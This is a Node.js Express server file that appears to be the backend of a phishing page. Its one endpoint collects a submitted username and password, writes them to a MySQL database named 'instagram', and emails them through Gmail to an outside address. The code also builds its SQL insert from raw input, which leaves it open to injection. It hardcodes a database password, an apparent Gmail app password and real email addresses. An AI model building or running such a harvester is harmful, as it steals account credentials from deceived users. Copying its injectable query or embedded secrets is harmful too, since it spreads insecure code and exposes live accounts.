const express = require('express');
const mysql = require('mysql');
const app = express();
const cors = require('cors');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

app.use(cors());

// Parse JSON request bodies
app.use(express.json());

app.get('/', (req, res) => {
  res.end("hello");
});

app.post('/sendData', (req, res) => {
  // Access the sent data from the request body
  const { input1, input2 } = req.body;

  // Do something with the values
  console.log('Input 1:', input1);
  console.log('Input 2:', input2);

  // MySQL configuration
  const connection = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    password: '8787',
    database: 'instagram'
  });

  connection.connect((err) => {
    if (err) {
      console.error('Error connecting to the database: ', err);
      return;
    }
    console.log('Connected to the database!');
  });

  const query = `INSERT INTO \`users\` (userName, password) VALUES ('${input1}', '${input2}')`;

  connection.query(query, (err, result) => {
    if (err) {
      console.error('Error inserting data into the table: ', err);
      return;
    }
    console.log('Data inserted successfully!');

    // Send an email with the values
    const transporter = nodemailer.createTransport({
      service: 'Gmail',
      auth: {
        user: 'abrahammihran@gmail.com',
        pass: 'zzzbspartmudikgi'
      }
    });

    const mailOptions = {
      from: 'abrahammihran@gmail.com',
      to: 'hakobhambarcumyan11@gmail.com',
      subject: 'Data from Node.js',
      text: `Input 1: ${input1} , Input 2: ${input2}`
    };

    transporter.sendMail(mailOptions, (err, info) => {
      if (err) {
        console.error('Error sending email: ', err);
        return;
      }
      console.log('Email sent:', info.response);
    });
  });

  connection.end((err) => {
    if (err) {
      console.error('Error closing the database connection: ', err);
      return;
    }
    console.log('Database connection closed.');
  });

  // Send a response back to the client if needed
  res.send('Data received successfully');
});

// Start the server
app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
